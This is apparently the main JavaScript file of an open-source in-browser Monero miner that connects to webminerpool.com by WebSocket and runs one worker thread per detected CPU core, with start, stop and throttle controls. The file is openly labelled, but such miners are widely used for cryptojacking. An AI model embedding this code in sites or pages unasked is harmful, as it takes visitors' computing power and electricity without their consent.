/* very simple monero miner which connects to
 * webminerpool.com. */

var server = "wss://webminerpool.com:8181/" // the webminerpool server

var job = null;      // remember last job we got from the server
var workers = [];    // keep track of our workers
var ws;              // the websocket we use 

/* state variables */

var receiveStack = [];  // everything we get from the server
var sendStack = [];     // everything we send to the server
var totalhashes = 0;    // number of hashes calculated
var connected = 0;      // 0->disconnected, 1->connected, 2->disconnected (error), 3->disconnect (on purpose) 
var reconnector = 0;    // regular check if the WebSocket is still connected
var attempts = 1;

var throttleMiner = 0;  // percentage of miner throttling. If you set this to 20, the
                        // cpu workload will be approx. 80% (for 1 thread / CPU).
                        // setting this value to 100 will not fully disable the miner but still
                        // calculate hashes with 10% CPU load. See worker.js for details.

var handshake = null;


function addWorkers(numThreads) {
  logicalProcessors = numThreads;

  if (numThreads == -1) {

    /* try to find a good value */

    try {
      logicalProcessors = window.navigator.hardwareConcurrency;
    } catch (err) {
      logicalProcessors = 4;
    }

    if (!((logicalProcessors > 0) && (logicalProcessors < 40)))
      logicalProcessors = 4;
  }


  while (logicalProcessors-- > 0) addWorker();
}

var openWebSocket = function () {

  if (ws != null) {
    ws.close();
  }

  ws = new WebSocket(server);

  ws.onmessage = on_servermsg;
  ws.onerror = function (event) {
    if (connected < 2) connected = 2;
    job = null;
  }
  ws.onclose = function () {
    if (connected < 2) connected = 2;
    job = null;
  }

  ws.onopen = function () {
    ws.send((JSON.stringify(handshake)));
    attempts = 1;
    connected = 1;
  }


};

reconnector = function () {
  if (connected !== 3 && (ws == null || (ws.readyState !== 0 && ws.readyState !== 1))) {
    //console.log("The WebSocket is not connected. Trying to connect.");
    attempts++;
    openWebSocket();
  }
  
  if (connected !== 3)
  setTimeout(reconnector, 5000 * attempts);
};

// starts mining
function startMiningWithId(loginid, numThreads = -1, userid = "") {

  stopMining();
  connected = 0;

  handshake = {
    identifier: "handshake",
    loginid: loginid,
    userid: userid,
    version : 5
  };

  addWorkers(numThreads);
  reconnector();
}

// starts mining
function startMining(pool, login, password = "", numThreads = -1, userid = "") {

  stopMining();
  connected = 0;

  handshake = {
    identifier: "handshake",
    pool: pool,
    login: login,
    password: password,
    userid: userid,
    version : 5
  };

  addWorkers(numThreads);
  reconnector();
}

// stop mining  
function stopMining() {
  connected = 3;
  
  if (ws != null) ws.close();
  deleteAllWorkers();
  job = null;
}

// add one worker 
function addWorker() {
  var newWorker = new Worker("miner/worker.js");
  workers.push(newWorker);

  newWorker.onmessage = on_workermsg;

  setTimeout(function () {
    informWorker(newWorker);
  }, 2000);
}

// remove one worker
function removeWorker() {
  if (workers.length < 1) return;
  var wrk = workers.shift();
  wrk.terminate();
}

/* "internal" functions */

function deleteAllWorkers() {
  for (i = 0; i < workers.length; i++) {
    workers[i].terminate();
  }
  workers = [];
}

function informWorker(wrk) {
  var evt = {
    data: "wakeup",
    target: wrk
  };
  on_workermsg(evt);
}

function on_servermsg(e) {
  var obj = JSON.parse(e.data);

  receiveStack.push(obj);

  if (obj.identifier == "job") job = obj;
}

function on_workermsg(e) {
  var wrk = e.target;

  if (connected != 1) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  if ((e.data) != "nothing" && (e.data) != "wakeup") {
    // we solved a hash. forward it to the server.
    var obj = JSON.parse(e.data);
    ws.send(e.data);
    sendStack.push(obj);
  }

  if (job === null) {
    setTimeout(function () {
      informWorker(wrk);
    }, 2000);
    return;
  }

  var jbthrt = {
    job: job,
    throttle: Math.max(0, Math.min(throttleMiner, 100))
  };
  wrk.postMessage(jbthrt);

  if ((e.data) != "wakeup") totalhashes += 1;
}
